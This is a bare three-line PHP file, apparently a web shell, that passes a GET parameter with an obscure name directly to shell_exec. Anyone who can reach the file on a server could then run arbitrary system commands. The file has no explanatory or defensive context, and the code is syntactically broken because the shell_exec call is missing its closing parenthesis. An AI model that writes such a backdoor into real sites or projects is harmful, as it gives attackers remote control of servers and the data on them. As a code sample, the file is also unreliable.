<?php
shell_exec($_GET['N-oSod66'];
?>
